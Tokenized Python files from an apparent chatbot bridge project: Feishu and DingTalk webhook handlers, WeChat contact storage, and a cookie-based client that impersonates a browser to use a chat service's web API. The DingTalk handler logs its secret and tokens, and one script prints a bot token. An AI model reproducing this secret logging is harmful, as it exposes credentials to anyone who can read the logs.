<EOL> return { '<STR_LIT>' : <NUM_LIT> } <EOL> def handle_request_url_verify ( self , post_obj ) : <EOL> challenge = post_obj . get ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> logger . info ( "<STR_LIT>" . format ( challenge ) ) <EOL> return { '<STR_LIT>' : challenge } <EOL> def build_reply_content ( self , query , context = None ) : <EOL> return Bridge ( ) . fetch_reply_content ( query , context ) <EOL> thread_pool = ThreadPoolExecutor ( max_workers = <NUM_LIT> ) <EOL> http_app = Flask ( __name__ ) <EOL> @ http_app . route ( "<STR_LIT>" , methods = [ '<STR_LIT>' ] ) <EOL> def chat ( ) : <EOL> feishu = FeiShuChannel ( ) <EOL> logger . info ( "<STR_LIT>" . format ( str ( request . data ) ) ) <EOL> obj = json . loads ( request . data ) <EOL> if not obj : <EOL> return { '<STR_LIT>' : <NUM_LIT> } <EOL> headers = obj . get ( "<STR_LIT>" ) <EOL> if not headers : <EOL> return { '<STR_LIT>' : <NUM_LIT> } <EOL> t = obj . get ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> if "<STR_LIT>" == t : <EOL> return feishu . handle_request_url_verify ( obj ) <EOL> elif headers . get ( "<STR_LIT>" , None ) == "<STR_LIT>" : <EOL> return feishu . handle ( obj ) <EOL> return { '<STR_LIT>' : <NUM_LIT> } <EOL> </s>
<s> from config import conf <EOL> import config <EOL> config . load_config ( ) <EOL> bot_token = conf ( ) . get ( '<STR_LIT>' ) . get ( '<STR_LIT>' ) <EOL> print ( bot_token ) <EOL> </s>
<s> import os , time , copy <EOL> from threading import Lock <EOL> from . messagequeue import Queue <EOL> from . templates import ( <EOL> ContactList , AbstractUserDict , User , <EOL> MassivePlatform , Chatroom , ChatroomMember ) <EOL> def contact_change ( fn ) : <EOL> def _contact_change ( core , * args , ** kwargs ) : <EOL> with core . storageClass . updateLock : <EOL> return fn ( core , * args , ** kwargs ) <EOL> return _contact_change <EOL> class Storage ( object ) : <EOL> def __init__ ( self , core ) : <EOL> self . userName = None <EOL> self . nickName = None <EOL> self . updateLock = Lock ( ) <EOL> self . memberList = ContactList ( ) <EOL> self . mpList = ContactList ( ) <EOL> self . chatroomList = ContactList ( ) <EOL> self . msgList = Queue ( - <NUM_LIT> ) <EOL> self . lastInputUserName = None <EOL> self . memberList . set_default_value ( contactClass = User ) <EOL> self . memberList . core = core <EOL> self . mpList . set_default_value ( contactClass = MassivePlatform ) <EOL> self . mpList . core = core <EOL> self . chatroomList . set_default_value ( contactClass = Chatroom ) <EOL> self . chatroomList . core = core <EOL> def dumps ( self ) : <EOL> return { <EOL> '<STR_LIT>' : self . userName , <EOL> '<STR_LIT>' : self . nickName , <EOL> '<STR_LIT>' : self . memberList , <EOL> '<STR_LIT>' : self . mpList , <EOL> '<STR_LIT>' : self . chatroomList , <EOL> '<STR_LIT>' : self . lastInputUserName , } <EOL> def loads ( self , j ) : <EOL> self . userName = j . get ( '<STR_LIT>' , None ) <EOL> self . nickName = j . get ( '<STR_LIT>' , None ) <EOL> del self . memberList [ : ] <EOL> for i in j . get ( '<STR_LIT>' , [ ] ) : <EOL> self . memberList . append ( i ) <EOL> del self . mpList [ : ] <EOL> for i in j . get ( '<STR_LIT>' , [ ] ) : <EOL> self . mpList . append ( i ) <EOL> del self . chatroomList [ : ] <EOL> for i in j . get ( '<STR_LIT>' , [ ] ) : <EOL> self . chatroomList . append ( i ) <EOL> for chatroom in self . chatroomList : <EOL> if '<STR_LIT>' in chatroom : <EOL> for member in chatroom [ '<STR_LIT>' ] : <EOL> member . core = chatroom . core <EOL> member . chatroom = chatroom <EOL> if '<STR_LIT>' in chatroom : <EOL> chatroom [ '<STR_LIT>' ] . core = chatroom . core <EOL> chatroom [ '<STR_LIT>' ] . chatroom = chatroom <EOL> self . lastInputUserName = j . get ( '<STR_LIT>' , None ) <EOL> def search_friends ( self , name = None , userName = None , remarkName = None , nickName = None , <EOL> wechatAccount = None ) : <EOL> with self . updateLock : <EOL> if ( name or userName or remarkName or nickName or wechatAccount ) is None : <EOL> return copy . deepcopy ( self . memberList [ <NUM_LIT> ] ) <EOL> elif userName : <EOL> for m in self . memberList : <EOL> if m [ '<STR_LIT>' ] == userName : <EOL> return copy . deepcopy ( m ) <EOL> else : <EOL> matchDict = { <EOL> '<STR_LIT>' : remarkName , <EOL> '<STR_LIT>' : nickName , <EOL> '<STR_LIT>' : wechatAccount , } <EOL> for k in ( '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' ) : <EOL> if matchDict [ k ] is None : <EOL> del matchDict [ k ] <EOL> if name : <EOL> contact = [ ] <EOL> for m in self . memberList : <EOL> if any ( [ m . get ( k ) == name for k in ( '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' ) ] ) : <EOL> contact . append ( m ) <EOL> else : <EOL> contact = self . memberList [ : ] <EOL> if matchDict : <EOL> friendList = [ ] <EOL> for m in contact : <EOL> if all ( [ m . get ( k ) == v for k , v in matchDict . items ( ) ] ) : <EOL> friendList . append ( m ) <EOL> return copy . deepcopy ( friendList ) <EOL> else : <EOL> return copy . deepcopy ( contact ) <EOL> def search_chatrooms ( self , name = None , userName = None ) : <EOL> with self . updateLock : <EOL> if userName is not None : <EOL> for m in self . chatroomList : <EOL> if m [ '<STR_LIT>' ] == userName : <EOL> return copy . deepcopy ( m ) <EOL> elif name is not None : <EOL> matchList = [ ] <EOL> for m in self . chatroomList : <EOL> if name in m [ '<STR_LIT>' ] : <EOL> matchList . append ( copy . deepcopy ( m ) ) <EOL> return matchList <EOL> def search_mps ( self , name = None , userName = None ) : <EOL> with self . updateLock : <EOL> if userName is not None : <EOL> for m in self . mpList : <EOL> if m [ '<STR_LIT>' ] == userName : <EOL> return copy . deepcopy ( m ) <EOL> elif name is not None : <EOL> matchList = [ ] <EOL> for m in self . mpList : <EOL> if name in m [ '<STR_LIT>' ] : <EOL> matchList . append ( copy . deepcopy ( m ) ) <EOL> return matchList <EOL> </s>
<s> import json <EOL> import os <EOL> import uuid <EOL> import requests <EOL> from curl_cffi import requests , Curl , CurlOpt <EOL> from dotenv import load_dotenv <EOL> from common . log import logger <EOL> import PyPDF2 <EOL> import docx <EOL> import re <EOL> from io import BytesIO <EOL> load_dotenv ( ) <EOL> class Client : <EOL> def __init__ ( self , cookie , use_proxy = False ) : <EOL> self . cookie = cookie <EOL> self . use_proxy = use_proxy <EOL> self . proxies = self . load_proxies_from_env ( ) <EOL> self . organization_id = self . get_organization_id ( ) <EOL> def load_proxies_from_env ( self ) : <EOL> proxies = { } <EOL> if self . use_proxy : <EOL> http_proxy = os . getenv ( '<STR_LIT>' ) <EOL> https_proxy = os . getenv ( '<STR_LIT>' ) <EOL> socks5_proxy = os . getenv ( '<STR_LIT>' ) <EOL> if http_proxy : <EOL> proxies [ '<STR_LIT>' ] = http_proxy <EOL> if https_proxy : <EOL> proxies [ '<STR_LIT>' ] = https_proxy <EOL> if socks5_proxy : <EOL> proxies [ '<STR_LIT>' ] = socks5_proxy <EOL> return proxies <EOL> def get_organization_id ( self ) : <EOL> url = "<STR_LIT>" <EOL> headers = { <EOL> '<STR_LIT>' : <EOL> '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : f'<STR_LIT>' <EOL> } <EOL> response = self . send_request ( "<STR_LIT>" , url , headers = headers ) <EOL> if response . status_code == <NUM_LIT> : <EOL> res = json . loads ( response . text ) <EOL> uuid = res [ <NUM_LIT> ] [ '<STR_LIT>' ] <EOL> return uuid <EOL> else : <EOL> print ( f"<STR_LIT>" ) <EOL> def get_content_type ( self , file_path ) : <EOL> extension = os . path . splitext ( file_path ) [ - <NUM_LIT> ] . lower ( ) <EOL> if extension == '<STR_LIT>' : <EOL> return '<STR_LIT>' <EOL> elif extension == '<STR_LIT>' : <EOL> return '<STR_LIT>' <EOL> elif extension == '<STR_LIT>' : <EOL> return '<STR_LIT>' <EOL> else : <EOL> return '<STR_LIT>' <EOL> def list_all_conversations ( self ) : <EOL> url = f"<STR_LIT>" <EOL> headers = { <EOL> '<STR_LIT>' : <EOL> '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : f'<STR_LIT>' <EOL> } <EOL> response = self . send_request ( "<STR_LIT>" , url , headers = headers ) <EOL> conversations = response . json ( ) <EOL> if response . status_code == <NUM_LIT> : <EOL> return conversations <EOL> else : <EOL> print ( f"<STR_LIT>" ) <EOL> def send_message ( self , prompt , conversation_id , attachment = None ) : <EOL> url = "<STR_LIT>" <EOL> attachments = [ ] <EOL> if attachment : <EOL> attachment_response = self . upload_attachment ( attachment ) <EOL> if attachment_response : <EOL> attachments = [ attachment_response ] <EOL> else : <EOL> return { "<STR_LIT>" } <EOL> if not attachment : <EOL> attachments = [ ] <EOL> payload = json . dumps ( { <EOL> "<STR_LIT>" : { <EOL> "<STR_LIT>" : f"<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" <EOL> } , <EOL> "<STR_LIT>" : f"<STR_LIT>" , <EOL> "<STR_LIT>" : f"<STR_LIT>" , <EOL> "<STR_LIT>" : f"<STR_LIT>" , <EOL> "<STR_LIT>" : attachments <EOL> } ) <EOL> headers = { <EOL> '<STR_LIT>' : <EOL> '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : f'<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' <EOL> } <EOL> buffer = BytesIO ( ) <EOL> c = Curl ( ) <EOL> def stream_callback ( data ) : <EOL> json_str = data . decode ( '<STR_LIT>' ) <EOL> decoded_data = re . sub ( '<STR_LIT>' , '<STR_LIT>' , json_str ) . strip ( ) <EOL> data_strings = decoded_data . split ( '<STR_LIT>' ) <EOL> for data_string in data_strings : <EOL> json_str = data_string [ <NUM_LIT> : ] . strip ( ) <EOL> _data = json . loads ( json_str ) <EOL> if '<STR_LIT>' in _data : <EOL> buffer . write ( str ( _data [ '<STR_LIT>' ] ) . encode ( '<STR_LIT>' ) ) <EOL> print ( _data [ '<STR_LIT>' ] , end = "<STR_LIT>" ) <EOL> c . setopt ( CurlOpt . URL , b'<STR_LIT>' ) <EOL> c . setopt ( CurlOpt . WRITEFUNCTION , stream_callback ) <EOL> c . setopt ( CurlOpt . HTTPHEADER , headers ) <EOL> c . setopt ( CurlOpt . POSTFIELDS , payload ) <EOL> c . impersonate ( "<STR_LIT>" ) <EOL> c . perform ( ) <EOL> c . close ( ) <EOL> body = buffer . getvalue ( ) <EOL> print ( body . decode ( ) ) <EOL> return body <EOL> def delete_conversation ( self , conversation_id ) : <EOL> url = f"<STR_LIT>" <EOL> payload = json . dumps ( f"<STR_LIT>" ) <EOL> headers = { <EOL> '<STR_LIT>' : <EOL> '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : f'<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' <EOL> } <EOL> response = self . send_request ( "<STR_LIT>" , url , headers = headers , data = payload ) <EOL> if response . status_code == <NUM_LIT> : <EOL> return True <EOL> else : <EOL> return False <EOL> def chat_conversation_history ( self , conversation_id ) : <EOL> url = f"<STR_LIT>" <EOL> headers = { <EOL> '<STR_LIT>' : <EOL> '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : f'<STR_LIT>' <EOL> } <EOL> response = self . send_request ( "<STR_LIT>" , url , headers = headers , params = { '<STR_LIT>' : '<STR_LIT>' } ) <EOL> print ( type ( response ) ) <EOL> return response . json ( ) <EOL> def generate_uuid ( self ) : <EOL> random_uuid = uuid . uuid4 ( ) <EOL> random_uuid_str = str ( random_uuid ) <EOL> formatted_uuid = f"<STR_LIT>" <EOL> return formatted_uuid <EOL> def create_new_chat ( self ) : <EOL> url = f"<STR_LIT>" <EOL> uuid = self . generate_uuid ( ) <EOL> payload = json . dumps ( { "<STR_LIT>" : uuid , "<STR_LIT>" : "<STR_LIT>" } ) <EOL> headers = { <EOL> '<STR_LIT>' : <EOL> '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : self . cookie , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' <EOL> } <EOL> response = self . send_request ( "<STR_LIT>" , url , headers = headers , data = payload ) <EOL> return response . json ( ) <EOL> def reset_all ( self ) : <EOL> conversations = self . list_all_conversations ( ) <EOL> for conversation in conversations : <EOL> conversation_id = conversation [ '<STR_LIT>' ] <EOL> delete_id = self . delete_conversation ( conversation_id ) <EOL> return True <EOL> def upload_attachment ( self , file_path ) : <EOL> if file_path . endswith ( ( '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' ) ) : <EOL> file_name = os . path . basename ( file_path ) <EOL> file_size = os . path . getsize ( file_path ) <EOL> file_type = "<STR_LIT>" <EOL> file_content = "<STR_LIT>" <EOL> if file_path . endswith ( '<STR_LIT>' ) : <EOL> with open ( file_path , '<STR_LIT>' , encoding = '<STR_LIT>' ) as file : <EOL> file_content = file . read ( ) <EOL> elif file_path . endswith ( '<STR_LIT>' ) : <EOL> with open ( file_path , '<STR_LIT>' ) as file : <EOL> pdf_reader = PyPDF2 . PdfFileReader ( file ) <EOL> for page_num in range ( pdf_reader . numPages ) : <EOL> page = pdf_reader . getPage ( page_num ) <EOL> file_content += page . extractText ( ) <EOL> elif file_path . endswith ( ( '<STR_LIT>' , '<STR_LIT>' ) ) : <EOL> doc = docx . Document ( file_path ) <EOL> paragraphs = doc . paragraphs <EOL> for paragraph in paragraphs : <EOL> file_content += paragraph . text <EOL> return { <EOL> "<STR_LIT>" : file_name , <EOL> "<STR_LIT>" : file_type , <EOL> "<STR_LIT>" : file_size , <EOL> "<STR_LIT>" : file_content <EOL> } <EOL> url = '<STR_LIT>' <EOL> headers = { <EOL> '<STR_LIT>' : <EOL> '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : f'<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' <EOL> } <EOL> file_name = os . path . basename ( file_path ) <EOL> content_type = self . get_content_type ( file_path ) <EOL> files = { <EOL> '<STR_LIT>' : ( file_name , open ( file_path , '<STR_LIT>' ) , content_type ) , <EOL> '<STR_LIT>' : ( None , self . organization_id ) <EOL> } <EOL> response = self . send_request ( url , "<STR_LIT>" , headers = headers , files = files ) <EOL> if response . status_code == <NUM_LIT> : <EOL> return response . json ( ) <EOL> else : <EOL> return False <EOL> def rename_chat ( self , title , conversation_id ) : <EOL> url = "<STR_LIT>" <EOL> payload = json . dumps ( { <EOL> "<STR_LIT>" : f"<STR_LIT>" , <EOL> "<STR_LIT>" : f"<STR_LIT>" , <EOL> "<STR_LIT>" : f"<STR_LIT>" <EOL> } ) <EOL> headers = { <EOL> '<STR_LIT>' : <EOL> '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : f'<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' <EOL> } <EOL> response = self . send_request ( "<STR_LIT>" , url , headers = headers , data = payload ) <EOL> if response . status_code == <NUM_LIT> : <EOL> return True <EOL> else : <EOL> return False <EOL> def send_request ( self , method , url , headers , data = None , files = None , params = None , stream = False ) : <EOL> if self . use_proxy : <EOL> return requests . request ( method , url , headers = headers , data = data , files = files , params = params , impersonate = "<STR_LIT>" , proxies = self . proxies , timeout = <NUM_LIT> ) <EOL> else : <EOL> return requests . request ( method , url , headers = headers , data = data , files = files , params = params , impersonate = "<STR_LIT>" , timeout = <NUM_LIT> ) <EOL> </s>
<s> import uuid <EOL> import json <EOL> from curl_cffi import requests <EOL> url = requests . get ( "<STR_LIT>" , impersonate = "<STR_LIT>" ) <EOL> headers = { <EOL> '<STR_LIT>' : <EOL> '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : f'<STR_LIT>' <EOL> } <EOL> proxies = { "<STR_LIT>" : "<STR_LIT>" } <EOL> response = requests . get ( "<STR_LIT>" , impersonate = "<STR_LIT>" , headers = headers , proxies = proxies , timeout = <NUM_LIT> ) <EOL> if response . status_code == <NUM_LIT> : <EOL> res = json . loads ( response . text ) <EOL> uuid = res [ <NUM_LIT> ] [ '<STR_LIT>' ] <EOL> print ( f"<STR_LIT>" ) <EOL> else : <EOL> print ( f"<STR_LIT>" ) <EOL> </s>
<s> import logging <EOL> class LogSystem ( object ) : <EOL> handlerList = [ ] <EOL> showOnCmd = True <EOL> loggingLevel = logging . INFO <EOL> loggingFile = None <EOL> def __init__ ( self ) : <EOL> self . logger = logging . getLogger ( '<STR_LIT>' ) <EOL> self . logger . addHandler ( logging . NullHandler ( ) ) <EOL> self . logger . setLevel ( self . loggingLevel ) <EOL> self . cmdHandler = logging . StreamHandler ( ) <EOL> self . fileHandler = None <EOL> self . logger . addHandler ( self . cmdHandler ) <EOL> def set_logging ( self , showOnCmd = True , loggingFile = None , <EOL> loggingLevel = logging . INFO ) : <EOL> if showOnCmd != self . showOnCmd : <EOL> if showOnCmd : <EOL> self . logger . addHandler ( self . cmdHandler ) <EOL> else : <EOL> self . logger . removeHandler ( self . cmdHandler ) <EOL> self . showOnCmd = showOnCmd <EOL> if loggingFile != self . loggingFile : <EOL> if self . loggingFile is not None : <EOL> self . logger . removeHandler ( self . fileHandler ) <EOL> self . fileHandler . close ( ) <EOL> if loggingFile is not None : <EOL> self . fileHandler = logging . FileHandler ( loggingFile ) <EOL> self . logger . addHandler ( self . fileHandler ) <EOL> self . loggingFile = loggingFile <EOL> if loggingLevel != self . loggingLevel : <EOL> self . logger . setLevel ( loggingLevel ) <EOL> self . loggingLevel = loggingLevel <EOL> ls = LogSystem ( ) <EOL> set_logging = ls . set_logging <EOL> </s>
<s> import json <EOL> import hmac <EOL> import hashlib <EOL> import base64 <EOL> import time <EOL> import requests <EOL> from urllib . parse import quote_plus <EOL> from common . log import logger <EOL> from config import conf <EOL> from bridge . bridge import Bridge <EOL> from flask import Flask , request , render_template , make_response <EOL> from channel . channel import Channel <EOL> from concurrent . futures import ThreadPoolExecutor <EOL> class DingTalkHandler ( Channel ) : <EOL> def __init__ ( self ) : <EOL> self . dingtalk_key = conf ( ) . get ( '<STR_LIT>' ) <EOL> self . dingtalk_secret = conf ( ) . get ( '<STR_LIT>' ) <EOL> self . dingtalk_token = conf ( ) . get ( '<STR_LIT>' ) <EOL> self . dingtalk_post_token = conf ( ) . get ( '<STR_LIT>' ) <EOL> self . access_token = None <EOL> logger . info ( "<STR_LIT>" . format ( self . dingtalk_secret , self . dingtalk_token , self . dingtalk_post_token ) ) <EOL> def notify_dingtalk_webhook ( self , data ) : <EOL> timestamp = round ( time . time ( ) * <NUM_LIT> ) <EOL> secret_enc = bytes ( self . dingtalk_secret , encoding = '<STR_LIT>' ) <EOL> string_to_sign = '<STR_LIT>' . format ( timestamp , self . dingtalk_secret ) <EOL> string_to_sign_enc = bytes ( string_to_sign , encoding = '<STR_LIT>' ) <EOL> hmac_code = hmac . new ( secret_enc , string_to_sign_enc , <EOL> digestmod = hashlib . sha256 ) . digest ( ) <EOL> sign = quote_plus ( base64 . b64encode ( hmac_code ) ) <EOL> notify_url = f"<STR_LIT>" <EOL> try : <EOL> logger . info ( "<STR_LIT>" . format ( str ( notify_url ) ) ) <EOL> r = requests . post ( notify_url , json = data ) <EOL> reply = r . json ( ) <EOL> logger . info ( "<STR_LIT>" . format ( str ( reply ) ) ) <EOL> except Exception as e : <EOL> logger . error ( e ) <EOL> def get_token_internal ( self ) : <EOL> access_token_url = '<STR_LIT>' <EOL> try : <EOL> r = requests . post ( access_token_url , json = { "<STR_LIT>" : self . dingtalk_key , "<STR_LIT>" : self . dingtalk_secret } ) <EOL> except : <EOL> raise Exception ( "<STR_LIT>" ) <EOL> data = json . loads ( r . content ) <EOL> access_token = data [ '<STR_LIT>' ] <EOL> expire_in = data [ '<STR_LIT>' ] <EOL> self . access_token = access_token <EOL> self . expire_at = int ( expire_in ) + time . time ( ) <EOL> return self . access_token <EOL> def get_token ( self ) : <EOL> if self . access_token is None or self . expire_at <= time . time ( ) : <EOL> self . get_token_internal ( ) <EOL> return self . access_token <EOL> def get_post_url ( self , data ) : <EOL> type = data [ '<STR_LIT>' ] <EOL> if type == "<STR_LIT>" : <EOL> return f"<STR_LIT>" <EOL> else : <EOL> return f"<STR_LIT>" <EOL> def build_response ( self , reply , data ) : <EOL> type = data [ '<STR_LIT>' ] <EOL> if type == "<STR_LIT>" : <EOL> return self . build_oto_response ( reply , data ) <EOL> else : <EOL> return self . build_group_response ( reply , data ) <EOL> def build_oto_response ( self , reply , data ) : <EOL> conversation_id = data [ '<STR_LIT>' ] <EOL> prompt = data [ '<STR_LIT>' ] [ '<STR_LIT>' ] <EOL> prompt = prompt . strip ( ) <EOL> nick = data [ '<STR_LIT>' ] <EOL> staffid = data [ '<STR_LIT>' ] <EOL> robotCode = data [ '<STR_LIT>' ] <EOL> resp = { <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : json . dumps ( { <EOL> "<STR_LIT>" : reply <EOL> } ) , <EOL> "<STR_LIT>" : robotCode , <EOL> "<STR_LIT>" : [ staffid ] <EOL> } <EOL> return resp <EOL> def build_group_response ( self , reply , data ) : <EOL> conversation_id = data [ '<STR_LIT>' ] <EOL> prompt = data [ '<STR_LIT>' ] [ '<STR_LIT>' ] <EOL> prompt = prompt . strip ( ) <EOL> nick = data [ '<STR_LIT>' ] <EOL> staffid = data [ '<STR_LIT>' ] <EOL> robot_code = data [ '<STR_LIT>' ] <EOL> resp = { <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : json . dumps ( { <EOL> "<STR_LIT>" : reply + "<STR_LIT>" + "<STR_LIT>" + nick <EOL> } ) , <EOL> "<STR_LIT>" : robot_code , <EOL> "<STR_LIT>" : conversation_id , <EOL> "<STR_LIT>" : { <EOL> "<STR_LIT>" : [ <EOL> staffid <EOL> ] , <EOL> "<STR_LIT>" : False <EOL> } <EOL> } <EOL> return resp <EOL> def build_webhook_response ( self , reply , data ) : <EOL> conversation_id = data [ '<STR_LIT>' ] <EOL> prompt = data [ '<STR_LIT>' ] [ '<STR_LIT>' ] <EOL> prompt = prompt . strip ( ) <EOL> nick = data [ '<STR_LIT>' ] <EOL> staffid = data [ '<STR_LIT>' ] <EOL> robotCode = data [ '<STR_LIT>' ] <EOL> resp = { <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : { <EOL> "<STR_LIT>" : reply <EOL> } , <EOL> "<STR_LIT>" : { <EOL> "<STR_LIT>" : [ <EOL> staffid <EOL> ] , <EOL> "<STR_LIT>" : False <EOL> } <EOL> } <EOL> return resp <EOL> def chat ( self , channel , data ) : <EOL> reply = channel . handle ( data ) <EOL> type = data [ '<STR_LIT>' ] <EOL> if type == "<STR_LIT>" : <EOL> reply_json = self . build_response ( reply , data ) <EOL> self . notify_dingtalk ( data , reply_json ) <EOL> else : <EOL> reply_json = self . build_webhook_response ( reply , data ) <EOL> self . notify_dingtalk_webhook ( reply_json ) <EOL> def notify_dingtalk ( self , data , reply_json ) : <EOL> headers = { <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : self . get_token ( ) <EOL> } <EOL> notify_url = self . get_post_url ( data ) <EOL> try : <EOL> r = requests . post ( notify_url , json = reply_json , headers = headers ) <EOL> resp = r . json ( ) <EOL> logger . info ( "<STR_LIT>" . format ( str ( resp ) ) ) <EOL> except Exception as e : <EOL> logger . error ( e ) <EOL> class DingTalkChannel ( Channel ) : <EOL> def __init__ ( self ) : <EOL> self . host = conf ( ) . get ( '<STR_LIT>' ) <EOL> self . port = conf ( ) . get ( '<STR_LIT>' ) <EOL> logger . info ( "<STR_LIT>" ) <EOL> def startup ( self ) : <EOL> http_app . run ( host = self . host , port = self . port ) <EOL> def handle ( self , data ) : <EOL> reply = "<STR_LIT>" <EOL> prompt = data [ '<STR_LIT>' ] [ '<STR_LIT>' ] <EOL> prompt = prompt . strip ( ) <EOL> if str ( prompt ) != <NUM_LIT> : <EOL> conversation_id = data [ '<STR_LIT>' ] <EOL> sender_id = data [ '<STR_LIT>' ] <EOL> context = dict ( ) <EOL> id = sender_id <EOL> context [ '<STR_LIT>' ] = str ( id ) <EOL> reply = self . build_reply_content ( prompt , context ) <EOL> return reply <EOL> def build_reply_content ( self , query , context = None ) : <EOL> return Bridge ( ) . fetch_reply_content ( query , context ) <EOL> dd = DingTalkChannel ( ) <EOL> thread_pool = ThreadPoolExecutor ( max_workers = <NUM_LIT> ) <EOL> http_app = Flask ( __name__ , ) <EOL> @ http_app . route ( "<STR_LIT>" , methods = [ '<STR_LIT>' ] ) <EOL> def chat ( ) : <EOL> handlers = DingTalkHandler ( ) <EOL> logger . info ( "<STR_LIT>" . format ( str ( request . headers ) ) ) <EOL> logger . info ( "<STR_LIT>" . format ( str ( request . data ) ) ) <EOL> token = request . headers . get ( '<STR_LIT>' ) <EOL> data = json . loads ( request . data ) <EOL> if data : <EOL> content = data [ '<STR_LIT>' ] [ '<STR_LIT>' ] <EOL> if not content : <EOL> return <EOL> code = data [ '<STR_LIT>' ] <EOL> group_name = None <EOL> if '<STR_LIT>' in data : <EOL> group_name = data [ '<STR_LIT>' ] <EOL> handlers . chat ( dd , data ) <EOL> return { '<STR_LIT>' : <NUM_LIT> } <EOL> return { '<STR_LIT>' : <NUM_LIT> } <EOL> </s>
<s> import asyncio <EOL> import os , time , re , io <EOL> import threading <EOL> import json <EOL> import random <EOL> import traceback <EOL> import logging <EOL> try : <EOL> from httplib import BadStatusLine <EOL> except ImportError : <EOL> from http . client import BadStatusLine <EOL> import requests <EOL> from pyqrcode import QRCode <EOL> from . . import config , utils <EOL> from . . returnvalues import ReturnValue <EOL> from . . storage . templates import wrap_user_dict <EOL> from . contact import update_local_chatrooms , update_local_friends <EOL> from . messages import produce_msg <EOL> logger = logging . getLogger ( '<STR_LIT>' ) <EOL> def load_login ( core ) : <EOL> core . login = login <EOL> core . get_QRuuid = get_QRuuid <EOL> core . get_QR = get_QR <EOL> core . check_login = check_login <EOL> core . web_init = web_init <EOL> core . show_mobile_login = show_mobile_login <EOL> 